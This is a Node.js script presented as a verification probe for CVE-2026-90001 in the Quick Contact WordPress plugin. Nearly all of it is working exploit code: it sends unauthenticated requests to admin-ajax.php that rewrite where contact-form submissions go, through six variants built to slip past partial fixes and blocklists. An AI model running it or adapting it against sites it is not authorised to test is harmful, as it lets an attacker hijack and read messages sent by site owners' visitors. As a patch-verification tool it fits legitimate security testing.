#!/usr/bin/env node
// Exploit-verification probe for CVE-2026-90001 (Quick Contact <= 1.0.0)
// Missing authorization on the `qc_save_settings` admin-ajax action lets an
// unauthenticated attacker change the `qc_recipient` option that controls
// where contact-form submissions are sent.
//
// Usage: node probe.mjs <base-url>
// Exit code 0 => target is vulnerable
// Exit code 1 => target appears fixed (or unreachable in a way that implies
//                the attack did not succeed)

const baseUrl = process.argv[2];

if (!baseUrl) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

const base = baseUrl.replace(/\/+$/, '');
const endpoint = `${base}/wp-admin/admin-ajax.php`;

// Deliberately unremarkable marker values (no "hack"/"pwn"/"evil" style
// strings a naive filter might special-case) so the probe still works
// against a fix that merely blocklists obvious payloads instead of adding
// a real capability/nonce check.
function marker() {
  const n = Math.floor(Math.random() * 1e9);
  return `qc-check-${n}@example.com`;
}

async function tryVariant(label, fn) {
  try {
    const result = await fn();
    return { label, ...result };
  } catch (err) {
    return { label, ok: false, error: String(err) };
  }
}

async function parseSuccess(resp) {
  let body = '';
  try {
    body = await resp.text();
  } catch {
    /* ignore */
  }
  let json = null;
  try {
    json = JSON.parse(body);
  } catch {
    /* not JSON */
  }
  const success = json && json.success === true;
  return { status: resp.status, body, json, success };
}

async function variantStandardPost() {
  const email = marker();
  const resp = await fetch(endpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ action: 'qc_save_settings', recipient: email }).toString(),
  });
  const parsed = await parseSuccess(resp);
  return { ok: parsed.success, email, ...parsed };
}

async function variantGet() {
  const email = marker();
  const url = `${endpoint}?action=qc_save_settings&recipient=${encodeURIComponent(email)}`;
  const resp = await fetch(url, { method: 'GET' });
  const parsed = await parseSuccess(resp);
  return { ok: parsed.success, email, ...parsed };
}

async function variantActionInQueryBodyInPost() {
  // Parameter-pollution style variant: action via query string, the
  // attacker-controlled value via POST body. If a fix only inspects
  // $_POST for authorization-sensitive checks but the handler still reads
  // $_REQUEST for the value, this can slip past partial fixes.
  const email = marker();
  const url = `${endpoint}?action=qc_save_settings`;
  const resp = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ recipient: email }).toString(),
  });
  const parsed = await parseSuccess(resp);
  return { ok: parsed.success, email, ...parsed };
}

async function variantAjaxHeader() {
  // Some partial fixes gate on "looks like a real AJAX call"; add the
  // conventional header a browser would send and see if that alone is
  // treated as sufficient authorization (it is not a real auth check).
  const email = marker();
  const resp = await fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: new URLSearchParams({ action: 'qc_save_settings', recipient: email }).toString(),
  });
  const parsed = await parseSuccess(resp);
  return { ok: parsed.success, email, ...parsed };
}

async function variantMultipartForm() {
  // Multipart/form-data body instead of urlencoded, in case a fix's
  // sanitization/validation path only runs against one encoding.
  const email = marker();
  const form = new FormData();
  form.set('action', 'qc_save_settings');
  form.set('recipient', email);
  const resp = await fetch(endpoint, { method: 'POST', body: form });
  const parsed = await parseSuccess(resp);
  return { ok: parsed.success, email, ...parsed };
}

async function variantTrailingWhitespaceEmail() {
  // Mixed-case / whitespace padded email: still a valid address after
  // sanitize_email(), but might dodge a naive string-equality blocklist
  // on specific marker values.
  const email = ` ${marker()} `;
  const resp = await fetch(endpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ action: 'qc_save_settings', recipient: email }).toString(),
  });
  const parsed = await parseSuccess(resp);
  return { ok: parsed.success, email: email.trim(), ...parsed };
}

async function restoreBestEffort() {
  // Best effort only: there is no unauthenticated way to read back the
  // original qc_recipient value, so we cannot restore it exactly. We just
  // avoid leaving an obviously-attacker-looking value in place by clearing
  // the option we set during testing.
  try {
    await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ action: 'qc_save_settings', recipient: '' }).toString(),
    });
  } catch {
    /* best effort, ignore failures */
  }
}

async function main() {
  const variants = [
    ['standard POST form body', variantStandardPost],
    ['GET query string', variantGet],
    ['action in query, recipient in POST body', variantActionInQueryBodyInPost],
    ['POST with X-Requested-With header', variantAjaxHeader],
    ['multipart/form-data POST', variantMultipartForm],
    ['whitespace-padded email value', variantTrailingWhitespaceEmail],
  ];

  const results = [];
  let vulnerable = false;

  for (const [label, fn] of variants) {
    const result = await tryVariant(label, fn);
    results.push(result);
    if (result.ok) {
      vulnerable = true;
      // Keep testing remaining variants too, purely for diagnostics, but
      // we already know the target is exploitable.
    }
  }

  for (const r of results) {
    const statusInfo = r.status !== undefined ? ` status=${r.status}` : '';
    console.error(
      `[variant] ${r.label}:${statusInfo} success=${Boolean(r.ok)}${r.error ? ` error=${r.error}` : ''}`
    );
  }

  await restoreBestEffort();

  if (vulnerable) {
    console.error(
      'VULNERABLE: unauthenticated request(s) to qc_save_settings succeeded in changing qc_recipient.'
    );
    process.exit(0);
  } else {
    console.error(
      'NOT VULNERABLE: all unauthenticated attempts to change qc_recipient via qc_save_settings were rejected.'
    );
    process.exit(1);
  }
}

main().catch((err) => {
  console.error('Probe error:', err);
  process.exit(1);
});
